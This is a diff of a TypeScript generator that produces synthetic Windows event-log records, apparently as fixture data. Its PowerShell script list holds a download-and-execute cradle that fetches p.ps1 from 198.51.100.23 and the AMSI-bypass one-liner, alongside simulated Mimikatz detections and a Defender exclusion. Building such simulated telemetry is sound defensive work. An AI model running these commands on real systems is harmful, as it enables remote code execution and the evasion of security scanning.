             ? `Faulting application name: ${app}, version: 1.40.3.8, time stamp: 0x67102c1a\nFaulting module name: ${app === "loader.exe" ? "hook64.dll" : "ntdll.dll"}, version: 10.0.26100.2161, time stamp: 0x2b6f2bd5\nException code: 0xc0000005\nFault offset: 0x00000000000a3f41\nFaulting process id: 0x4A18\nFaulting application start time: 0x1DB26E0A1C9F3E1\nFaulting application path: C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\${app}\nFaulting module path: C:\\Windows\\SYSTEM32\\ntdll.dll\nReport Id: ${guid(r).slice(1, -1)}`
@@ -904,28 +1524,167 @@ const applicationMaker: Maker = (r, t) => {
       };
     }
     case 1001:
-      return { provider: "Windows Error Reporting", classic: true, qualifiers: 0, eventId: 1001, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", String(int(r, 1e9, 2e9))], ["Data 2", "5"], ["Data 3", "StoreAgentScanForUpdatesFailure0"], ["Data 4", "Not available"]], message: `Fault bucket ${int(r, 1e9, 2e9)}, type 5\nEvent Name: StoreAgentScanForUpdatesFailure0\nResponse: Not available\nCab Id: 0\n\nProblem signature:\nP1: Update;\nP2: 8024500c\nP3: 26100\nP4: 2161\n\nAttached files:\n\nThese files may be available here:\n\n\nAnalysis symbol: \nRechecking for solution: 0\nReport Id: ${guid(r).slice(1, -1)}\nReport Status: 4\nHashed bucket: \nCab Guid: 0` };
+      return {
+        provider: "Windows Error Reporting",
+        classic: true,
+        qualifiers: 0,
+        eventId: 1001,
+        level: 4,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [
+          ["Data 1", String(int(r, 1e9, 2e9))],
+          ["Data 2", "5"],
+          ["Data 3", "StoreAgentScanForUpdatesFailure0"],
+          ["Data 4", "Not available"],
+        ],
+        message: `Fault bucket ${int(r, 1e9, 2e9)}, type 5\nEvent Name: StoreAgentScanForUpdatesFailure0\nResponse: Not available\nCab Id: 0\n\nProblem signature:\nP1: Update;\nP2: 8024500c\nP3: 26100\nP4: 2161\n\nAttached files:\n\nThese files may be available here:\n\n\nAnalysis symbol: \nRechecking for solution: 0\nReport Id: ${guid(r).slice(1, -1)}\nReport Status: 4\nHashed bucket: \nCab Guid: 0`,
+      };
     case 1026:
-      return { provider: ".NET Runtime", classic: true, qualifiers: 0, eventId: 1026, level: 2, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data", "Application: Updater.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.Net.WebException\n   at System.Net.WebClient.DownloadDataInternal(System.Uri, System.Net.WebRequest ByRef)"]], message: "Application: Updater.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.Net.WebException\n   at System.Net.WebClient.DownloadDataInternal(System.Uri, System.Net.WebRequest ByRef)\n   at Updater.Program.Main(System.String[])" };
+      return {
+        provider: ".NET Runtime",
+        classic: true,
+        qualifiers: 0,
+        eventId: 1026,
+        level: 2,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [
+          [
+            "Data",
+            "Application: Updater.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.Net.WebException\n   at System.Net.WebClient.DownloadDataInternal(System.Uri, System.Net.WebRequest ByRef)",
+          ],
+        ],
+        message:
+          "Application: Updater.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.Net.WebException\n   at System.Net.WebClient.DownloadDataInternal(System.Uri, System.Net.WebRequest ByRef)\n   at Updater.Program.Main(System.String[])",
+      };
     case 1040:
     case 1033:
-      return { provider: "MsiInstaller", classic: true, qualifiers: 0, eventId: id, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], sid: USER_SID, pid: 0, data: [["Data 1", "C:\\Users\\alex\\Downloads\\node-v24.11.0-x64.msi"], ["Data 2", "8580"]], message: id === 1040 ? "Beginning a Windows Installer transaction: C:\\Users\\alex\\Downloads\\node-v24.11.0-x64.msi. Client Process Id: 8580." : "Windows Installer installed the product. Product Name: Node.js. Product Version: 24.11.0. Product Language: 1033. Manufacturer: OpenJS Foundation. Installation success or error status: 0." };
+      return {
+        provider: "MsiInstaller",
+        classic: true,
+        qualifiers: 0,
+        eventId: id,
+        level: 4,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        sid: USER_SID,
+        pid: 0,
+        data: [
+          ["Data 1", "C:\\Users\\alex\\Downloads\\node-v24.11.0-x64.msi"],
+          ["Data 2", "8580"],
+        ],
+        message:
+          id === 1040
+            ? "Beginning a Windows Installer transaction: C:\\Users\\alex\\Downloads\\node-v24.11.0-x64.msi. Client Process Id: 8580."
+            : "Windows Installer installed the product. Product Name: Node.js. Product Version: 24.11.0. Product Language: 1033. Manufacturer: OpenJS Foundation. Installation success or error status: 0.",
+      };
     case 8224:
-      return { provider: "VSS", classic: true, qualifiers: 0, eventId: 8224, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Binary", "2D20436F64653A20434F525356434330303030303637332D2043616C6C3A20434F525356434330303030303634312D205049443A202030303030353539362D205449443A202030303030363531362D20434D443A2020433A5C57494E444F57535C73797374656D33325C76737376632E657865202020"]], message: "The VSS service is shutting down due to idle timeout." };
+      return {
+        provider: "VSS",
+        classic: true,
+        qualifiers: 0,
+        eventId: 8224,
+        level: 4,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [
+          [
+            "Binary",
+            "2D20436F64653A20434F525356434330303030303637332D2043616C6C3A20434F525356434330303030303634312D205049443A202030303030353539362D205449443A202030303030363531362D20434D443A2020433A5C57494E444F57535C73797374656D33325C76737376632E657865202020",
+          ],
+        ],
+        message: "The VSS service is shutting down due to idle timeout.",
+      };
     case 15:
-      return { provider: "SecurityCenter", classic: true, qualifiers: 0, eventId: 15, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", "Windows Defender"], ["Data 2", "SECURITY_PRODUCT_STATE_ON"]], message: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON." };
+      return {
+        provider: "SecurityCenter",
+        classic: true,
+        qualifiers: 0,
+        eventId: 15,
+        level: 4,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [
+          ["Data 1", "Windows Defender"],
+          ["Data 2", "SECURITY_PRODUCT_STATE_ON"],
+        ],
+        message: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.",
+      };
     case 1534:
-      return { provider: "Microsoft-Windows-User Profiles Service", guid: "{89b1e9f0-5aff-44a6-9b44-0a07a7ce5845}", eventId: 1534, level: 3, task: 0, keywords: "0x8000000000000000", sid: "S-1-5-18", pid: 1440, data: [["Event", "Initialization"], ["Context", "{56EA1054-1959-467F-BE3B-A2A787C4B6EA}"], ["Error", "Access is denied. "]], message: "Profile notification of event Initialization for component {56EA1054-1959-467F-BE3B-A2A787C4B6EA} failed, error code is Access is denied. \n." };
+      return {
+        provider: "Microsoft-Windows-User Profiles Service",
+        guid: "{89b1e9f0-5aff-44a6-9b44-0a07a7ce5845}",
+        eventId: 1534,
+        level: 3,
+        task: 0,
+        keywords: "0x8000000000000000",
+        sid: "S-1-5-18",
+        pid: 1440,
+        data: [
+          ["Event", "Initialization"],
+          ["Context", "{56EA1054-1959-467F-BE3B-A2A787C4B6EA}"],
+          ["Error", "Access is denied. "],
+        ],
+        message:
+          "Profile notification of event Initialization for component {56EA1054-1959-467F-BE3B-A2A787C4B6EA} failed, error code is Access is denied. \n.",
+      };
     case 326:
     case 327:
-      return { provider: "ESENT", classic: true, qualifiers: 0, eventId: id, level: 4, task: 1, taskName: "General", keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", "svchost"], ["Data 2", "5916,D,50"], ["Data 3", ""], ["Data 4", "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db"], ["Data 5", "0"]], message: `svchost (5916,D,50) The database engine ${id === 326 ? "attached" : "detached"} a database (1, C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db). (Time=0 seconds)` };
+      return {
+        provider: "ESENT",
+        classic: true,
+        qualifiers: 0,
+        eventId: id,
+        level: 4,
+        task: 1,
+        taskName: "General",
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [
+          ["Data 1", "svchost"],
+          ["Data 2", "5916,D,50"],
+          ["Data 3", ""],
+          ["Data 4", "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db"],
+          ["Data 5", "0"],
+        ],
+        message: `svchost (5916,D,50) The database engine ${id === 326 ? "attached" : "detached"} a database (1, C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db). (Time=0 seconds)`,
+      };
     case 0:
       // a provider without message files: raw XML only
-      return { provider: "edgeupdate", classic: true, qualifiers: 0, eventId: 0, level: 4, keywords: "0x80000000000000", data: [["Data", "Service stopped"]], message: null };
+      return {
+        provider: "edgeupdate",
+        classic: true,
+        qualifiers: 0,
+        eventId: 0,
+        level: 4,
+        keywords: "0x80000000000000",
+        data: [["Data", "Service stopped"]],
+        message: null,
+      };
     case 9027:
-      return { provider: "Desktop Window Manager", classic: true, qualifiers: 16384, eventId: 9027, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [], message: "The Desktop Window Manager has registered the session port." };
+      return {
+        provider: "Desktop Window Manager",
+        classic: true,
+        qualifiers: 16384,
+        eventId: 9027,
+        level: 4,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [],
+        message: "The Desktop Window Manager has registered the session port.",
+      };
     default:
-      return { provider: "Shellmosaic", classic: true, qualifiers: 0, eventId: 1, level: 4, keywords: "0x80000000000000", data: [["Data", `Session restored (${int(r, 1, 6)} tabs, ${int(r, 1, 12)} panes)`]], message: null };
+      return {
+        provider: "Shellmosaic",
+        classic: true,
+        qualifiers: 0,
+        eventId: 1,
+        level: 4,
+        keywords: "0x80000000000000",
+        data: [["Data", `Session restored (${int(r, 1, 6)} tabs, ${int(r, 1, 12)} panes)`]],
+        message: null,
+      };
   }
 };
 
@@ -935,7 +1694,10 @@ const SCRIPTS: [string, number][] = [
   ["Get-ChildItem -Path $env:TEMP -Filter *.log | Remove-Item -Force", 5],
   ["Import-Module PSReadLine; Set-PSReadLineOption -PredictionSource History", 5],
   ["$client = New-Object Net.WebClient\nIEX ($client.DownloadString('http://198.51.100.23:8080/p.ps1'))", 3],
-  ["[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)", 3],
+  [
+    "[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)",
+    3,
+  ],
   ["Get-Process | Sort-Object CPU -Descending | Select-Object -First 10", 5],
   ["{ Set-StrictMode -Version 1; $_.PSMessageDetails }", 5],
   ["Invoke-WebRequest -Uri https://github.com/PowerShell/PowerShell/releases/latest -UseBasicParsing", 5],
@@ -944,7 +1706,13 @@ const SCRIPTS: [string, number][] = [
 
 const powershellMaker: Maker = (r) => {
   const id = weighted(r, [4104, 4103, 40961, 40962, 53504], [10, 6, 1, 1, 1]);
-  const ps = { provider: "Microsoft-Windows-PowerShell", guid: "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", pid: int(r, 2000, 30000) & ~3, sid: USER_SID, activity: guid(r).toUpperCase() };
+  const ps = {
+    provider: "Microsoft-Windows-PowerShell",
+    guid: "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
+    pid: int(r, 2000, 30000) & ~3,
+    sid: USER_SID,
+    activity: guid(r).toUpperCase(),
+  };
   if (id === 4104) {
     const [script, level] = weighted(r, SCRIPTS, [6, 6, 1, 0.5, 6, 8, 3, 0.4]);
     const sb = guid(r).slice(1, -1);
@@ -958,12 +1726,25 @@ const powershellMaker: Maker = (r) => {
       opcode: 15,
       opcodeName: "On create calls",
       keywords: "0x0",
-      data: [["MessageNumber", "1"], ["MessageTotal", "1"], ["ScriptBlockText", script], ["ScriptBlockId", sb], ["Path", level === 3 ? "" : "C:\\Users\\alex\\Documents\\WindowsPowerShell\\profile.ps1"]],
+      data: [
+        ["MessageNumber", "1"],
+        ["MessageTotal", "1"],
+        ["ScriptBlockText", script],
+        ["ScriptBlockId", sb],
+        ["Path", level === 3 ? "" : "C:\\Users\\alex\\Documents\\WindowsPowerShell\\profile.ps1"],
+      ],
       message: `Creating Scriptblock text (1 of 1):\n${script}\n\nScriptBlock ID: ${sb}\nPath: ${level === 3 ? "" : "C:\\Users\\alex\\Documents\\WindowsPowerShell\\profile.ps1"}`,
     };
   }
   if (id === 4103) {
-    const cmd = pick(r, ["Get-Process", "Get-Service", "Out-Default", "Set-Location", "Get-NetTCPConnection", "Invoke-WebRequest"]);
+    const cmd = pick(r, [
+      "Get-Process",
+      "Get-Service",
+      "Out-Default",
+      "Set-Location",
+      "Get-NetTCPConnection",
+      "Invoke-WebRequest",
+    ]);
     return {
       ...ps,
       eventId: 4103,
@@ -974,7 +1755,14 @@ const powershellMaker: Maker = (r) => {
       opcode: 20,
       opcodeName: "To be used when operation is just executing a method",
       keywords: "0x0",
-      data: [["ContextInfo", `        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.26100.2161\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.26100.2161\n        Command Name = ${cmd}\n        Command Type = Cmdlet\n        User = ${ME}`], ["UserData", ""], ["Payload", `CommandInvocation(${cmd}): "${cmd}"`]],
+      data: [
+        [
+          "ContextInfo",
+          `        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.26100.2161\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.26100.2161\n        Command Name = ${cmd}\n        Command Type = Cmdlet\n        User = ${ME}`,
+        ],
+        ["UserData", ""],
+        ["Payload", `CommandInvocation(${cmd}): "${cmd}"`],
+      ],
       message: `CommandInvocation(${cmd}): "${cmd}"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Command Name = ${cmd}\n        Command Type = Cmdlet\n        User = ${ME}`,
     };
   }
@@ -988,15 +1776,27 @@ const powershellMaker: Maker = (r) => {
     opcode: id === 40961 ? 1 : id === 40962 ? 2 : 1,
     opcodeName: id === 40962 ? "Stop" : "Start",
     keywords: "0x0",
-    data: id === 53504 ? [["param1", String(ps.pid)], ["param2", "DefaultAppDomain"]] : [],
-    message: id === 40961 ? "PowerShell console is starting up" : id === 40962 ? "PowerShell console is ready for user input" : `Windows PowerShell has started an IPC listening thread on process: ${ps.pid} in AppDomain: DefaultAppDomain.`,
+    data:
+      id === 53504
+        ? [
+            ["param1", String(ps.pid)],
+            ["param2", "DefaultAppDomain"],
+          ]
+        : [],
+    message:
+      id === 40961
+        ? "PowerShell console is starting up"
+        : id === 40962
+          ? "PowerShell console is ready for user input"
+          : `Windows PowerShell has started an IPC listening thread on process: ${ps.pid} in AppDomain: DefaultAppDomain.`,
   };
 };
 
 const legacyPowershellMaker: Maker = (r) => {
   const id = weighted(r, [400, 403, 600, 800], [3, 3, 6, 2]);
   const prov = pick(r, ["Registry", "Alias", "Environment", "FileSystem", "Function", "Variable"]);
-  const host = "HostName=ConsoleHost\n\tHostVersion=5.1.26100.2161\n\tHostApplication=powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden\n\tEngineVersion=5.1.26100.2161";
+  const host =
+    "HostName=ConsoleHost\n\tHostVersion=5.1.26100.2161\n\tHostApplication=powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden\n\tEngineVersion=5.1.26100.2161";
   return {
     provider: "PowerShell",
     classic: true,
@@ -1007,7 +1807,11 @@ const legacyPowershellMaker: Maker = (r) => {
     taskName: id === 600 ? "Provider Lifecycle" : id === 800 ? "Pipeline Execution Details" : "Engine Lifecycle",
     keywords: "0x80000000000000",
     keywordNames: ["Classic"],
-    data: [["Data 1", id === 600 ? prov : "Available"], ["Data 2", id === 600 ? "Started" : "None"], ["Data 3", `\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\t${host}`]],
+    data: [
+      ["Data 1", id === 600 ? prov : "Available"],
+      ["Data 2", id === 600 ? "Started" : "None"],
+      ["Data 3", `\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\t${host}`],
+    ],
     message:
       id === 600
         ? `Provider "${prov}" is Started. \n\nDetails: \n\tProviderName=${prov}\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\t${host}`
@@ -1019,7 +1823,13 @@ const legacyPowershellMaker: Maker = (r) => {
 
 const defenderMaker: Maker = (r) => {
   const id = weighted(r, [1150, 2000, 1000, 1001, 5007, 1116, 1117, 5001, 2010], [6, 4, 2, 2, 2, 0.6, 0.6, 0.2, 2]);
-  const d = { provider: "Microsoft-Windows-Windows Defender", guid: "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}", pid: 4388, sid: "S-1-5-18", keywords: "0x8000000000000000" };
+  const d = {
+    provider: "Microsoft-Windows-Windows Defender",
+    guid: "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}",
+    pid: 4388,
+    sid: "S-1-5-18",
+    keywords: "0x8000000000000000",
+  };
   const threat = pick(r, [
     ["HackTool:Win64/Mimikatz!pz", "C:\\Users\\alex\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe", "High", "Tool"],
     ["Trojan:Win32/Wacatac.B!ml", "C:\\Users\\alex\\AppData\\Local\\Temp\\upd4721.dll", "Severe", "Trojan"],
@@ -1034,40 +1844,128 @@ const defenderMaker: Maker = (r) => {
         level: id === 1116 ? 3 : 4,
         task: 0,
         taskName: "None",
-        data: [["Product Name", "Microsoft Defender Antivirus"], ["Threat Name", threat[0]], ["Severity Name", threat[2]], ["Category Name", threat[3]], ["Path", `file:_${threat[1]}`], ["Detection User", ME], ["Process Name", "C:\\Windows\\explorer.exe"], ["Action Name", id === 1117 ? "Quarantine" : "Not Applicable"]],
+        data: [
+          ["Product Name", "Microsoft Defender Antivirus"],
+          ["Threat Name", threat[0]],
+          ["Severity Name", threat[2]],
+          ["Category Name", threat[3]],
+          ["Path", `file:_${threat[1]}`],
+          ["Detection User", ME],
+          ["Process Name", "C:\\Windows\\explorer.exe"],
+          ["Action Name", id === 1117 ? "Quarantine" : "Not Applicable"],
+        ],
         message: `Microsoft Defender Antivirus has ${id === 1116 ? "detected malware or other potentially unwanted software" : "taken action to protect this machine from malware or other potentially unwanted software"}.\n For more information please see the following:\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=${threat[0]}\n \tName: ${threat[0]}\n \tSeverity: ${threat[2]}\n \tCategory: ${threat[3]}\n \tPath: file:_${threat[1]}\n \tDetection Origin: Local machine\n \tDetection Type: Concrete\n \tDetection Source: Real-Time Protection\n \tUser: ${ME}\n \tProcess Name: C:\\Windows\\explorer.exe${id === 1117 ? "\n \tAction: Quarantine" : ""}`,
       };
     case 5001:
-      return { ...d, eventId: 5001, level: 3, data: [["Product Name", "Microsoft Defender Antivirus"]], message: "Microsoft Defender Antivirus Real-time Protection scanning for malware and other potentially unwanted software was disabled." };
+      return {
+        ...d,
+        eventId: 5001,
+        level: 3,
+        data: [["Product Name", "Microsoft Defender Antivirus"]],
+        message:
+          "Microsoft Defender Antivirus Real-time Protection scanning for malware and other potentially unwanted software was disabled.",
+      };
     case 5007:
-      return { ...d, eventId: 5007, level: 4, data: [["Old Value", ""], ["New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools = 0x0"]], message: "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\n \tOld value: \n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools = 0x0" };
+      return {
+        ...d,
+        eventId: 5007,
+        level: 4,
+        data: [
+          ["Old Value", ""],
+          ["New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools = 0x0"],
+        ],
+        message:
+          "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\n \tOld value: \n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools = 0x0",
+      };
     case 2000:
     case 2010:
-      return { ...d, eventId: id, level: 4, data: [["Current security intelligence Version", "1.421.161.0"], ["Previous security intelligence Version", "1.421.144.0"]], message: id === 2000 ? "Microsoft Defender Antivirus security intelligence version updated.\n \tCurrent security intelligence Version: 1.421.161.0\n \tPrevious security intelligence Version: 1.421.144.0\n \tSecurity intelligence Type: AntiVirus\n \tUpdate Type: Delta" : "Microsoft Defender Antivirus used Dynamic Signature Service to retrieve additional security intelligence to help protect your machine." };
+      return {
+        ...d,
+        eventId: id,
+        level: 4,
+        data: [
+          ["Current security intelligence Version", "1.421.161.0"],
+          ["Previous security intelligence Version", "1.421.144.0"],
+        ],
+        message:
+          id === 2000
+            ? "Microsoft Defender Antivirus security intelligence version updated.\n \tCurrent security intelligence Version: 1.421.161.0\n \tPrevious security intelligence Version: 1.421.144.0\n \tSecurity intelligence Type: AntiVirus\n \tUpdate Type: Delta"
+            : "Microsoft Defender Antivirus used Dynamic Signature Service to retrieve additional security intelligence to help protect your machine.",
+      };
     case 1000:
     case 1001:
-      return { ...d, eventId: id, level: 4, data: [["Scan Type", "Antimalware"], ["Scan Parameters", "Quick Scan"]], message: `Microsoft Defender Antivirus scan has ${id === 1000 ? "started" : "finished"}.\n \tScan ID: ${guid(r).toUpperCase()}\n \tScan Type: Antimalware\n \tScan Parameters: Quick Scan` };
+      return {
+        ...d,
+        eventId: id,
+        level: 4,
+        data: [
+          ["Scan Type", "Antimalware"],
+          ["Scan Parameters", "Quick Scan"],
+        ],
+        message: `Microsoft Defender Antivirus scan has ${id === 1000 ? "started" : "finished"}.\n \tScan ID: ${guid(r).toUpperCase()}\n \tScan Type: Antimalware\n \tScan Parameters: Quick Scan`,
+      };
     default:
-      return { ...d, eventId: 1150, level: 4, data: [["Platform version", "4.18.24090.11"], ["Engine version", "1.1.24090.11"]], message: "Endpoint Protection client is up and running in a healthy state. \n \tPlatform version: 4.18.24090.11\n \tEngine version: 1.1.24090.11\n \tSecurity intelligence version: 1.421.161.0" };
+      return {
+        ...d,
+        eventId: 1150,
+        level: 4,
+        data: [
+          ["Platform version", "4.18.24090.11"],
+          ["Engine version", "1.1.24090.11"],
+        ],
+        message:
+          "Endpoint Protection client is up and running in a healthy state. \n \tPlatform version: 4.18.24090.11\n \tEngine version: 1.1.24090.11\n \tSecurity intelligence version: 1.421.161.0",
+      };
   }
 };
 
-const TASKS = ["\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan", "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "\\GoogleUpdateTaskMachineUA{4A1C1E52-1D88-4D9C-9C1E-8F7E1E7D0B1A}", "\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser", "\\OneDrive Updater", "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start"];
+const TASKS = [
+  "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
+  "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+  "\\GoogleUpdateTaskMachineUA{4A1C1E52-1D88-4D9C-9C1E-8F7E1E7D0B1A}",
+  "\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser",
+  "\\OneDrive Updater",
+  "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
+];
 const taskMaker: Maker = (r) => {
   const id = weighted(r, [100, 102, 200, 201, 129, 110, 106, 140, 141, 101], [8, 8, 8, 8, 4, 2, 0.4, 0.6, 0.2, 0.6]);
   const task = r() < 0.06 ? "\\OneDrive Updater" : pick(r, TASKS);
   const inst = guid(r);
   const msgs: Record<number, [string, string, number]> = {
     100: [`Task Scheduler started "${inst}" instance of the "${task}" task for user "${SYSTEM}".`, "Task Started", 1],
-    102: [`Task Scheduler successfully finished "${inst}" instance of the "${task}" task for user "${SYSTEM}".`, "Task completed", 2],
-    200: [`Task Scheduler launched action "C:\\Windows\\system32\\usoclient.exe" in instance "${inst}" of task "${task}".`, "Action started", 1],
-    201: [`Task Scheduler successfully completed task "${task}" , instance "${inst}" , action "C:\\Windows\\system32\\usoclient.exe" with return code 0.`, "Action completed", 2],
-    129: [`Task Scheduler launch task "${task}" , instance "C:\\Windows\\system32\\usoclient.exe"  with process ID ${int(r, 1000, 30000)}.`, "Created Task Process", 0],
-    110: [`Task Scheduler launched "${inst}"  instance of task "${task}"  for user "${USER}" .`, "Task triggered by user", 0],
+    102: [
+      `Task Scheduler successfully finished "${inst}" instance of the "${task}" task for user "${SYSTEM}".`,
+      "Task completed",
+      2,
+    ],
+    200: [
+      `Task Scheduler launched action "C:\\Windows\\system32\\usoclient.exe" in instance "${inst}" of task "${task}".`,
+      "Action started",
+      1,
+    ],
+    201: [
+      `Task Scheduler successfully completed task "${task}" , instance "${inst}" , action "C:\\Windows\\system32\\usoclient.exe" with return code 0.`,
+      "Action completed",
+      2,
+    ],
+    129: [
+      `Task Scheduler launch task "${task}" , instance "C:\\Windows\\system32\\usoclient.exe"  with process ID ${int(r, 1000, 30000)}.`,
+      "Created Task Process",
+      0,
+    ],
+    110: [
+      `Task Scheduler launched "${inst}"  instance of task "${task}"  for user "${USER}" .`,
+      "Task triggered by user",
+      0,
+    ],
     106: [`User "${ME}"  registered Task Scheduler task "\\OneDrive Updater"`, "Task registered", 0],
     140: [`User "${ME}"  updated Task Scheduler task "\\OneDrive Updater"`, "Task registration updated", 0],
     141: [`User "${ME}"  deleted Task Scheduler task "\\OneDrive Updater"`, "Task registration deleted", 0],
-    101: [`Task Scheduler failed to start "${task}" task for user "${SYSTEM}". Additional Data: Error Value: 2147750687.`, "Task Start Failed", 0],
+    101: [
+      `Task Scheduler failed to start "${task}" task for user "${SYSTEM}". Additional Data: Error Value: 2147750687.`,
+      "Task Start Failed",
+      0,
+    ],
   };
   const [message, taskName, opcode] = msgs[id];
   return {
@@ -1084,7 +1982,11 @@ const taskMaker: Maker = (r) => {
     pid: 1844,
     sid: "S-1-5-18",
     activity: inst,
-    data: [["TaskName", id === 106 || id === 140 || id === 141 ? "\\OneDrive Updater" : task], ["UserContext", id >= 106 && id <= 141 ? ME : SYSTEM], ["InstanceId", inst]],
+    data: [
+      ["TaskName", id === 106 || id === 140 || id === 141 ? "\\OneDrive Updater" : task],
+      ["UserContext", id >= 106 && id <= 141 ? ME : SYSTEM],
+      ["InstanceId", inst],
+    ],
     message,
   };
 };
@@ -1093,7 +1995,13 @@ const rdpMaker: Maker = (r) => {
   const id = weighted(r, [21, 22, 24, 25, 23, 40], [3, 3, 2, 2, 1, 2]);
   const session = int(r, 1, 4);
   const addr = r() < 0.7 ? "LOCAL" : pick(r, ["192.168.1.66", "10.8.0.14"]);
-  const names: Record<number, string> = { 21: "Session logon succeeded", 22: "Shell start notification received", 23: "Session logoff succeeded", 24: "Session has been disconnected", 25: "Session reconnection succeeded" };
+  const names: Record<number, string> = {
+    21: "Session logon succeeded",
+    22: "Shell start notification received",
+    23: "Session logoff succeeded",
+    24: "Session has been disconnected",
+    25: "Session reconnection succeeded",
+  };
   return {
     provider: "Microsoft-Windows-TerminalServices-LocalSessionManager",
     guid: "{5d896912-022d-40aa-a3a8-4fa5515c76d7}",
@@ -1103,14 +2011,24 @@ const rdpMaker: Maker = (r) => {
     keywords: "0x1000000000000000",
     pid: 1240,
     sid: "S-1-5-18",
-    userData: id === 40 ? `<EventXML xmlns='Event_NS'><Session>${session}</Session><Reason>0</Reason></EventXML>` : `<EventXML xmlns='Event_NS'><User>${ME}</User><SessionID>${session}</SessionID><Address>${addr}</Address></EventXML>`,
-    message: id === 40 ? `Session ${session} has been disconnected, reason code 0` : `Remote Desktop Services: ${names[id]}:\n\nUser: ${ME}\nSession ID: ${session}\nSource Network Address: ${addr}`,
+    userData:
+      id === 40
+        ? `<EventXML xmlns='Event_NS'><Session>${session}</Session><Reason>0</Reason></EventXML>`
+        : `<EventXML xmlns='Event_NS'><User>${ME}</User><SessionID>${session}</SessionID><Address>${addr}</Address></EventXML>`,
+    message:
+      id === 40
+        ? `Session ${session} has been disconnected, reason code 0`
+        : `Remote Desktop Services: ${names[id]}:\n\nUser: ${ME}\nSession ID: ${session}\nSource Network Address: ${addr}`,
   };
 };
 
 const ciMaker: Maker = (r) => {
   const id = weighted(r, [3033, 3089, 3077, 3004], [3, 3, 1, 1]);
-  const dll = pick(r, ["\\Device\\HarddiskVolume3\\Users\\alex\\AppData\\Local\\Temp\\hook64.dll", "\\Device\\HarddiskVolume3\\Program Files\\Razer\\RzOverlay\\overlay64.dll", "\\Device\\HarddiskVolume3\\Users\\alex\\Tools\\inject.dll"]);
+  const dll = pick(r, [
+    "\\Device\\HarddiskVolume3\\Users\\alex\\AppData\\Local\\Temp\\hook64.dll",
+    "\\Device\\HarddiskVolume3\\Program Files\\Razer\\RzOverlay\\overlay64.dll",
+    "\\Device\\HarddiskVolume3\\Users\\alex\\Tools\\inject.dll",
+  ]);
   const proc = "\\Device\\HarddiskVolume3\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe";
   return {
     provider: "Microsoft-Windows-CodeIntegrity",
@@ -1123,7 +2041,15 @@ const ciMaker: Maker = (r) => {
     keywords: "0x8000000000000000",
     pid: 17744,
     sid: USER_SID,
